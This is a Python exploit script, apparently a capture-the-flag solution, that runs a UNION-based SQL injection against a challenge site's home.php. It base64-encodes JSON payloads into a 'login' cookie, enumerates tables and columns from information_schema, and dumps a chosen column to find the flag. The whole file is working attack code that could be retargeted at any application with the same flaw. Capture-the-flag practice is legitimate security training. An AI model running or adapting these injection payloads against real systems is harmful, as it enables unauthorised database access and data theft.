#!/usr/bin/env python3
from base64 import b64encode
import requests, re, json

URL = "http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php"

# Step 1: Extract table names
print("[*] Enumerating tables...")
tables = []
for i in range(90):
    payload = json.dumps({"ID": f"252352 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {i}"})
    cookie = b64encode(payload.encode()).decode()
    r = requests.get(URL, cookies={"login": cookie})

    if "Welcome" not in r.text:
        break

    match = re.findall(r"Welcome (.*?)!", r.text)
    if match:
        table = match[0]
        tables.append(table)
        print(f"  [{i}] {table}")

# Ask which table to inspect
table_idx = int(input("\n[?] Select table index: "))
target_table = tables[table_idx]
print(f"\n[*] Enumerating columns from '{target_table}'...")

# Step 2: Extract column names
columns = []
for i in range(10):
    payload = json.dumps({"ID": f"252352 UNION SELECT column_name FROM information_schema.columns WHERE table_name = '{target_table}' LIMIT 1 OFFSET {i}"})
    cookie = b64encode(payload.encode()).decode()
    r = requests.get(URL, cookies={"login": cookie})

    if "Welcome" not in r.text:
        break

    match = re.findall(r"Welcome (.*?)!", r.text)
    if match:
        column = match[0]
        columns.append(column)
        print(f"  [{i}] {column}")

# Ask which column to read
col_idx = int(input("\n[?] Select column index: "))
target_column = columns[col_idx]
print(f"\n[*] Extracting data from '{target_table}'.'{target_column}'...")

# Step 3: Extract column content
payload = json.dumps({"ID": f"252352 UNION SELECT {target_column} FROM {target_table}"})
cookie = b64encode(payload.encode()).decode()
r = requests.get(URL, cookies={"login": cookie})

match = re.findall(r"Welcome (.*?)!", r.text)
if match:
    result = match[0]
    print(f"\n[+] Result: {result}")

    if "flag" in result.lower():
        print(f"[+] Flag found: {result}")
else:
    print("[-] No result found")
